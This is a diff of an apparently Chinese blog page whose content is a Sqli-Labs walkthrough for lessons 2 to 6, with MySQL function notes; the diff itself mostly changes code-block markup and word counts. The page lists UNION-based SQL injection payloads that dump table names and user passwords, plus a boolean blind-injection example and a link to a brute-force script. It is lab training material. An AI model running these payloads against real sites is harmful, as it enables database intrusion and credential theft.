@@ -7,7 +7,7 @@
     <meta name="keywords" content="Sqli-Labs-Less-2~6, 书鱼">
     <meta name="description" content="一、Introduction第2~4题和Less-1的差不多其实，到了第五题,第六题开始盲注有点难了，学了一波mysql的操作还是有些收获
 二、HackLess-2传入一个单引号试探注入点，发现报错
-1..... syntax to use">
+..... syntax to use ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -385,7 +385,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    1.6k
                 </div>
                 
 
@@ -410,61 +410,107 @@
             <div id="articleContent">
                 <h3 id="一、Introduction"><a href="#一、Introduction" class="headerlink" title="一、Introduction"></a>一、Introduction</h3><p>第2~4题和Less-1的差不多其实，到了第五题,第六题开始盲注有点难了，学了一波mysql的操作还是有些收获</p>
 <h3 id="二、Hack"><a href="#二、Hack" class="headerlink" title="二、Hack"></a>二、Hack</h3><h4 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h4><p>传入一个单引号试探注入点，发现报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..... syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
-<a id="more"></a>
+<pre><code>..... syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></pre><a id="more"></a>
 <p>推测和Less-1唯一的区别在于没有单引号，只是用数字进行查询，例如</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=$id LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>所以payload和Less-1差别只在于一个单引号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,2,3 %23</span><br><span class="line">-1 union select 1,2,group_concat(schema_name) from information_schema.schemata%23</span><br><span class="line">-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &apos;security&apos;%23</span><br><span class="line">-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;users&apos;%23</span><br><span class="line">-1 union select 1,group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>
-<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>题目名字叫，Single quotes with twist string (基于错误的GET单引号变形字符型注入)<br>测试 ?id=1’ 得到</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...... syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
-<p>猜测语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=(&apos;$id&apos;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>所以通过前面加 -1’) 闭合前面 尾部加%23 （#的url编码）中间就可以为所欲为了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=(&apos;   -1&apos;)&#123;&#123;为所欲为&#125;&#125;#23    &apos;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>所以payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1&apos;)union select 1,2,3 %23</span><br><span class="line">-1&apos;)union select 1,2,group_concat(schema_name) from information_schema.schemata%23&apos;</span><br><span class="line">-1&apos;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &apos;security&apos;%23</span><br><span class="line">-1&apos;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;users&apos;%23</span><br><span class="line">-1&apos;)union select 1,group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>
-<h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>尝试’并未发现报错，尝试”发现报错</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
-<p>猜测语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>所以payload和3差不多只是单引号变双引号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1&quot;)union select 1,2,3 %23</span><br><span class="line">-1&quot;)union select 1,2,group_concat(schema_name) from information_schema.schemata%23&apos;</span><br><span class="line">-1&quot;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &apos;security&apos;%23</span><br><span class="line">-1&quot;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &apos;users&apos;%23</span><br><span class="line">-1&quot;)union select 1,group_concat(username),group_concat(password) from users%23</span><br></pre></td></tr></table></figure>
-<h4 id="Less-5-在导航页里显示的是要使用双查询"><a href="#Less-5-在导航页里显示的是要使用双查询" class="headerlink" title="Less-5 在导航页里显示的是要使用双查询"></a>Less-5 在导航页里显示的是要使用双查询</h4><p>发现正常或者注入成功是这样的<br><img src="2.png" alt=""><br>而一旦出错会报错<br><img src="1.png" alt=""><br>显然是布尔注入而且猜测语句</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&apos;$id&apos; LIMIT 0,1</span><br></pre></td></tr></table></figure>
-<p>当然就可以很多操作了，通过substr()、ascii()爆破也能得到一切<br>打个比方</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80%23     </span><br><span class="line">//截取数据库下第一个表的第一个字符与80ascii值进行对比</span><br><span class="line"></span><br><span class="line">找第二个字符只需要改成substr(&apos;xxx&apos;,2,1)即可。</span><br><span class="line">找第二个表改成limit 1,1</span><br></pre></td></tr></table></figure>
-<p>也可以直接拿这个盲注脚本爆破，参数自己改就行了<br><img src="4.png" alt=""><br><a href="https://github.com/Kit4y/Sql-Injection/blob/master/Src/Script/Bool-injection.py" target="_blank" rel="noopener">https://github.com/Kit4y/Sql-Injection/blob/master/Src/Script/Bool-injection.py</a></p>
+<pre><code>SELECT * FROM users WHERE id=$id LIMIT 0,1</code></pre><p>所以payload和Less-1差别只在于一个单引号</p>
+<pre><code>-1 union select 1,2,3 %23
+-1 union select 1,2,group_concat(schema_name) from information_schema.schemata%23
+-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23
+-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23
+-1 union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><p>题目名字叫，Single quotes with twist string (基于错误的GET单引号变形字符型注入)<br>测试 ?id=1’ 得到</p>
+<pre><code>...... syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code></pre><p>猜测语句</p>
+<pre><code>SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1</code></pre><p>所以通过前面加 -1’) 闭合前面 尾部加%23 （#的url编码）中间就可以为所欲为了</p>
+<pre><code>SELECT * FROM users WHERE id=(&#39;   -1&#39;){{为所欲为}}#23    &#39;) LIMIT 0,1</code></pre><p>所以payload</p>
+<pre><code>-1&#39;)union select 1,2,3 %23
+-1&#39;)union select 1,2,group_concat(schema_name) from information_schema.schemata%23&#39;
+-1&#39;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23
+-1&#39;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23
+-1&#39;)union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h4 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h4><p>尝试’并未发现报错，尝试”发现报错</p>
+<pre><code>syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code></pre><p>猜测语句</p>
+<pre><code>SELECT * FROM users WHERE id=(&quot;$id&quot;) LIMIT 0,1</code></pre><p>所以payload和3差不多只是单引号变双引号</p>
+<pre><code>-1&quot;)union select 1,2,3 %23
+-1&quot;)union select 1,2,group_concat(schema_name) from information_schema.schemata%23&#39;
+-1&quot;)union select 1,group_concat(table_name),3 from information_schema.tables where table_schema= &#39;security&#39;%23
+-1&quot;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name= &#39;users&#39;%23
+-1&quot;)union select 1,group_concat(username),group_concat(password) from users%23</code></pre><h4 id="Less-5-在导航页里显示的是要使用双查询"><a href="#Less-5-在导航页里显示的是要使用双查询" class="headerlink" title="Less-5 在导航页里显示的是要使用双查询"></a>Less-5 在导航页里显示的是要使用双查询</h4><p>发现正常或者注入成功是这样的<br><img src="2.png" alt=""><br>而一旦出错会报错<br><img src="1.png" alt=""><br>显然是布尔注入而且猜测语句</p>
+<pre><code>SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1</code></pre><p>当然就可以很多操作了，通过substr()、ascii()爆破也能得到一切<br>打个比方</p>
+<pre><code>1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80%23     
+//截取数据库下第一个表的第一个字符与80ascii值进行对比
+
+找第二个字符只需要改成substr(&#39;xxx&#39;,2,1)即可。
+找第二个表改成limit 1,1</code></pre><p>也可以直接拿这个盲注脚本爆破，参数自己改就行了<br><img src="4.png" alt=""><br><a href="https://github.com/Kit4y/Sql-Injection/blob/master/Src/Script/Bool-injection.py" target="_blank" rel="noopener">https://github.com/Kit4y/Sql-Injection/blob/master/Src/Script/Bool-injection.py</a></p>
 <h4 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h4><p>Less-6和Less-5的关系就和1♂2，3♂4的关系一样 把’改成”在脚本上修改就很行了</p>
 <h3 id="三、补上一次的遗漏知识点"><a href="#三、补上一次的遗漏知识点" class="headerlink" title="三、补上一次的遗漏知识点"></a>三、补上一次的遗漏知识点</h3><h4 id="3-1、MySql–三种注释写法"><a href="#3-1、MySql–三种注释写法" class="headerlink" title="3.1、MySql–三种注释写法"></a>3.1、MySql–三种注释写法</h4><h5 id="3-1-1、"><a href="#3-1-1、" class="headerlink" title="3.1.1、--"></a>3.1.1、<code>--</code></h5><p>后面一定要加空格</p>
 <h5 id="3-1-2、"><a href="#3-1-2、" class="headerlink" title="3.1.2、#"></a>3.1.2、<code>#</code></h5><h5 id="3-1-3、"><a href="#3-1-3、" class="headerlink" title="3.1.3、/**/"></a>3.1.3、<code>/**/</code></h5><h4 id="3-2、注入尾部为什么是-而不是"><a href="#3-2、注入尾部为什么是-而不是" class="headerlink" title="3.2、注入尾部为什么是--+而不是--"></a>3.2、注入尾部为什么是<code>--+</code>而不是<code>--</code></h4><p>这里字符-和字符+在URL中都是有固定的含义的 , 比如说+就在URL编码中就代表空格 , 而URL编码中-不用编码。我们也可以不用+ 而使用空格的URL编码 , 那么编码得到的URL就应该是 :</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1%27--%20</span><br></pre></td></tr></table></figure>
-<h4 id="3-3、-又为什么必须得编码-不编码可以吗"><a href="#3-3、-又为什么必须得编码-不编码可以吗" class="headerlink" title="3.3、#又为什么必须得编码 , 不编码可以吗 ?"></a>3.3、<code>#</code>又为什么必须得编码 , 不编码可以吗 ?</h4><p>不可以 , 因为# 在URL中是有固定的含义的 , 表示页面中的锚点 , 如果不进行编码浏览器就会将其当成页面的锚点 , 而这里我们是需要将其作为数据传输给服务器的 , 因此需要进行URL编码</p>
+<pre><code>id=1%27--%20</code></pre><h4 id="3-3、-又为什么必须得编码-不编码可以吗"><a href="#3-3、-又为什么必须得编码-不编码可以吗" class="headerlink" title="3.3、#又为什么必须得编码 , 不编码可以吗 ?"></a>3.3、<code>#</code>又为什么必须得编码 , 不编码可以吗 ?</h4><p>不可以 , 因为# 在URL中是有固定的含义的 , 表示页面中的锚点 , 如果不进行编码浏览器就会将其当成页面的锚点 , 而这里我们是需要将其作为数据传输给服务器的 , 因此需要进行URL编码</p>
 <h3 id="四、补充mysql的一些函数"><a href="#四、补充mysql的一些函数" class="headerlink" title="四、补充mysql的一些函数"></a>四、补充mysql的一些函数</h3><h4 id="4-1、substr"><a href="#4-1、substr" class="headerlink" title="4.1、substr()"></a>4.1、substr()</h4><p>substr()函数是用来截取数据库某一列字段中的一部分<br>常用的方式是： </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SBUSTR(str,pos);</span><br></pre></td></tr></table></figure>
-<p>就是从pos开始的位置，一直截取到最后。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSTR(str,pos,len);</span><br></pre></td></tr></table></figure>
-<p>这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。<br>需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始。<br>这点也很好理解，因为数据库不是我们平时写程序，他有他自己的一套习惯，数据库的记录都是从1开始没有从0开始</p>
+<pre><code>SBUSTR(str,pos); </code></pre><p>就是从pos开始的位置，一直截取到最后。</p>
+<pre><code>SUBSTR(str,pos,len);</code></pre><p>这种表示的意思是，就是从pos开始的位置，截取len个字符(空白也算字符)。<br>需要注意的是：如果pos为1(而不是0)，表示从第一个位置开始。<br>这点也很好理解，因为数据库不是我们平时写程序，他有他自己的一套习惯，数据库的记录都是从1开始没有从0开始</p>
 <h4 id="4-2、ascii-ord-函数"><a href="#4-2、ascii-ord-函数" class="headerlink" title="4.2、ascii(),ord()函数"></a>4.2、ascii(),ord()函数</h4><p>ASCII(str1)<br>返回字符串str的最左面字符的ASCII代码值。如果str是空字符串，返回0。如果str是NULL，返回NULL</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii(&quot;a&quot;);</span><br><span class="line">+------------+</span><br><span class="line">| ascii(&quot;a&quot;) |</span><br><span class="line">+------------+</span><br><span class="line">|         97 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>ORD() 函数<br>ORD() 函数返回字符串第一个字符的ASCII 值。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ord(&quot;a&quot;);</span><br><span class="line">+----------+</span><br><span class="line">| ord(&quot;a&quot;) |</span><br><span class="line">+----------+</span><br><span class="line">|       97 |</span><br><span class="line">+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<h4 id="4-3、LEFT-函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。"><a href="#4-3、LEFT-函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。" class="headerlink" title="4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。"></a>4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEFT(str,length);</span><br></pre></td></tr></table></figure>
-<p>LEFT()函数接受两个参数：<br>str是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select left(&quot;hello Kitty&quot;,5);</span><br><span class="line">+-----------------------+</span><br><span class="line">| left(&quot;hello Kitty&quot;,5) |</span><br><span class="line">+-----------------------+</span><br><span class="line">| hello                 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>与之类似的是right(str,length);</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select right(&quot;hello Kitty&quot;,5);</span><br><span class="line">+------------------------+</span><br><span class="line">| right(&quot;hello Kitty&quot;,5) |</span><br><span class="line">+------------------------+</span><br><span class="line">| Kitty                  |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<h4 id="4-4、REGEXP"><a href="#4-4、REGEXP" class="headerlink" title="4.4、REGEXP"></a>4.4、REGEXP</h4><p>可以在不使用数据库表的情况下用 SELECT 语句来测试正则表达式，REGEXP 检查总是返回0（没有匹配）或1（匹配）。可以用带文字串的 REGEXP 来测试表达式，并试验它们。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT &apos;kitty&apos; REGEXP &apos;[0-9a-z]&#123;6&#125;&apos;;</span><br><span class="line">+------------------------------+</span><br><span class="line">| &apos;kitty&apos; REGEXP &apos;[0-9a-z]&#123;6&#125;&apos; |</span><br><span class="line">+------------------------------+</span><br><span class="line">|                            0 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT &apos;kitty&apos; REGEXP &apos;[0-9a-z]&#123;5&#125;&apos;;</span><br><span class="line">+------------------------------+</span><br><span class="line">| &apos;kitty&apos; REGEXP &apos;[0-9a-z]&#123;5&#125;&apos; |</span><br><span class="line">+------------------------------+</span><br><span class="line">|                            1 |</span><br><span class="line">+------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<h4 id="4-5、MID"><a href="#4-5、MID" class="headerlink" title="4.5、MID()"></a>4.5、MID()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT MID(column_name,start[,length]) FROM table_name;</span><br></pre></td></tr></table></figure>
-<p>函数用于从文本字段中提取字符。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">| id | name         | url                       | alexa | country |</span><br><span class="line">+----+--------------+---------------------------+-------+---------+</span><br><span class="line">| 1  | Google       | https://www.google.cm/    | 1     | USA     |</span><br><span class="line">| 2  | 淘宝          | https://www.taobao.com/   | 13    | CN      |</span><br><span class="line">| 3  | 菜鸟教程      | http://www.runoob.com/    | 4689  | CN      |</span><br><span class="line">| 4  | 微博          | http://weibo.com/         | 20    | CN      |</span><br><span class="line">| 5  | Facebook      | https://www.facebook.com/ | 3     | USA     |</span><br><span class="line">| 7  | stackoverflow | http://stackoverflow.com/ |   0 | IND     |</span><br><span class="line">+----+---------------+---------------------------+-------+---------+</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT MID(name,1,4) AS ShortTitle</span><br><span class="line">FROM Websites;</span><br></pre></td></tr></table></figure>
-<p>返回结果<br><img src="3.png" alt=""></p>
+<pre><code>mysql&gt; select ascii(&quot;a&quot;);
++------------+
+| ascii(&quot;a&quot;) |
++------------+
+|         97 |
++------------+
+1 row in set (0.00 sec)</code></pre><p>ORD() 函数<br>ORD() 函数返回字符串第一个字符的ASCII 值。</p>
+<pre><code>mysql&gt; select ord(&quot;a&quot;);
++----------+
+| ord(&quot;a&quot;) |
++----------+
+|       97 |
++----------+
+1 row in set (0.00 sec)</code></pre><h4 id="4-3、LEFT-函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。"><a href="#4-3、LEFT-函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。" class="headerlink" title="4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。"></a>4.3、LEFT()函数是一个字符串函数，它返回具有指定长度的字符串的左边部分。</h4><pre><code>LEFT(str,length);</code></pre><p>LEFT()函数接受两个参数：<br>str是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。</p>
+<pre><code>mysql&gt; select left(&quot;hello Kitty&quot;,5);
++-----------------------+
+| left(&quot;hello Kitty&quot;,5) |
++-----------------------+
+| hello                 |
++-----------------------+
+1 row in set (0.00 sec)</code></pre><p>与之类似的是right(str,length);</p>
+<pre><code>mysql&gt; select right(&quot;hello Kitty&quot;,5);
++------------------------+
+| right(&quot;hello Kitty&quot;,5) |
++------------------------+
+| Kitty                  |
++------------------------+
+1 row in set (0.00 sec)</code></pre><h4 id="4-4、REGEXP"><a href="#4-4、REGEXP" class="headerlink" title="4.4、REGEXP"></a>4.4、REGEXP</h4><p>可以在不使用数据库表的情况下用 SELECT 语句来测试正则表达式，REGEXP 检查总是返回0（没有匹配）或1（匹配）。可以用带文字串的 REGEXP 来测试表达式，并试验它们。</p>
+<pre><code>mysql&gt; SELECT &#39;kitty&#39; REGEXP &#39;[0-9a-z]{6}&#39;;
++------------------------------+
+| &#39;kitty&#39; REGEXP &#39;[0-9a-z]{6}&#39; |
++------------------------------+
+|                            0 |
++------------------------------+
+1 row in set (0.00 sec)</code></pre><pre><code>mysql&gt; SELECT &#39;kitty&#39; REGEXP &#39;[0-9a-z]{5}&#39;;
++------------------------------+
+| &#39;kitty&#39; REGEXP &#39;[0-9a-z]{5}&#39; |
++------------------------------+
+|                            1 |
++------------------------------+
+1 row in set (0.00 sec)</code></pre><h4 id="4-5、MID"><a href="#4-5、MID" class="headerlink" title="4.5、MID()"></a>4.5、MID()</h4><pre><code>SELECT MID(column_name,start[,length]) FROM table_name;</code></pre><p>函数用于从文本字段中提取字符。</p>
+<pre><code>+----+--------------+---------------------------+-------+---------+
+| id | name         | url                       | alexa | country |
++----+--------------+---------------------------+-------+---------+
+| 1  | Google       | https://www.google.cm/    | 1     | USA     |
+| 2  | 淘宝          | https://www.taobao.com/   | 13    | CN      |
+| 3  | 菜鸟教程      | http://www.runoob.com/    | 4689  | CN      |
+| 4  | 微博          | http://weibo.com/         | 20    | CN      |
+| 5  | Facebook      | https://www.facebook.com/ | 3     | USA     |
+| 7  | stackoverflow | http://stackoverflow.com/ |   0 | IND     |
++----+---------------+---------------------------+-------+---------+</code></pre><pre><code>SELECT MID(name,1,4) AS ShortTitle
+FROM Websites;</code></pre><p>返回结果<br><img src="3.png" alt=""></p>
 <h4 id="4-6、if"><a href="#4-6、if" class="headerlink" title="4.6、if()"></a>4.6、if()</h4><p> 在mysql中if()函数的用法类似于java中的三目表达式，其用处也比较多，具体语法如下：</p>
 <p>IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select name,if(sex=0,&apos;女&apos;,&apos;男&apos;) as sex from student;</span><br><span class="line">+-------+-----+</span><br><span class="line">| name  | sex |</span><br><span class="line">+-------+-----+</span><br><span class="line">| name1 | 女  |</span><br><span class="line">| name2 | 女  |</span><br><span class="line">| name3 | 男  |</span><br><span class="line">| name4 | 女  |</span><br><span class="line">+-------+-----+</span><br><span class="line">rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<pre><code>mysql&gt; select name,if(sex=0,&#39;女&#39;,&#39;男&#39;) as sex from student;
++-------+-----+
+| name  | sex |
++-------+-----+
+| name1 | 女  |
+| name2 | 女  |
+| name3 | 男  |
+| name4 | 女  |
++-------+-----+
+rows in set (0.00 sec)</code></pre>
             </div>
             <hr/>
 
@@ -845,7 +891,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">175.5k</span>&nbsp;字
+                class="white-color">173.5k</span>&nbsp;字
             
             
             
